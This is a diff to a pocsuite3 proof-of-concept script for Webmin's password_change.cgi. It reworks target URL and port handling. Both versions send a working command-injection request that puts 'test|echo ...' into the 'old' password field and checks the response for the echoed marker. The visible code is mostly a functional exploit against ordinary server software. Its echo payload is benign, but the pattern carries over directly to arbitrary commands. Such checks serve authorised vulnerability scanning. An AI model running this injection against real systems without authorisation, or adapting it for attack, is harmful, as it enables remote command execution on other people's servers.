@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # coding: utf-8
-from urllib import parse
+from urllib.parse import urlparse
 from pocsuite3.api import requests as req
 from pocsuite3.api import register_poc
 from pocsuite3.api import Output, POCBase
@@ -8,8 +8,9 @@ from pocsuite3.api import POC_CATEGORY, VUL_TYPE
 
 req.packages.urllib3.disable_warnings()
 
+
 class TestPOC(POCBase):
-    vulID = '15107'
+    vulID = ''
     version = '1.0'
     author = 'jerome'
     vulDate = '2019-8-12'
@@ -38,24 +39,32 @@ class TestPOC(POCBase):
 
     def _verify(self):
         result = {}
-        port=10000
-        # 更改目标协议为https
-        target=self.url+'/password_change.cgi'
-        tmp=list(parse.urlparse(target))
-        tmp[0]='https'
-        target=parse.urlunparse(tmp)
-        # 定义请求头
-        post_cookies = {"redirect": "1", "testing": "1", "sid": "x", "sessiontest": "1"}
-        post_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Referer": self.url, "Content-Type": "application/x-www-form-urlencoded"}
-        #发送带指令的请求数据
-        post_data = {"user": "rootxx", "pam": '', "expired": "2", "old": "test|echo dky30186", "new1": "test2", "new2": "test2"}
-        response=req.post(target, headers=post_headers, cookies=post_cookies, data=post_data, verify=False)
-        # 根据回显判断目标是否存在漏洞
-        if response and response.status_code==200 and "dky30186" in response.text:
-        	result={'VerifyInfo': {}}
-        	result['VerifyInfo']['URL'] = target
+        pr = urlparse(self.url)
+        if pr.port:
+            ports = [pr.port]
+        else:
+            ports = [10000]
+        for scheme in ('https','http'):
+            for port in ports:
+                target = '{}://{}:{}/password_change.cgi'.format(
+                    scheme, pr.hostname, port)
+                # 定义请求头
+                post_cookies = {"redirect": "1", "testing": "1",
+                                "sid": "x", "sessiontest": "1"}
+                post_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en",
+                                "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Referer": target, "Content-Type": "application/x-www-form-urlencoded"}
+                # 发送带指令的请求数据
+                post_data = {"user": "rootxx", "pam": '', "expired": "2",
+                            "old": "test|echo 0xdeadbeaf", "new1": "test2", "new2": "test2"}
+                response = req.post(target, headers=post_headers,
+                                    cookies=post_cookies, data=post_data, verify=False)
+                # 根据回显判断目标是否存在漏洞
+                if response and response.status_code == 200 and "0xdeadbeaf" in response.text:
+                    result['VerifyInfo'] = {}
+                    result['VerifyInfo']['URL'] = '{}://{}:{}'.format(
+                        scheme,pr.hostname, port)
+                    break
         return self.parse_output(result)
-
 
     def _attack(self):
         return self._verify()
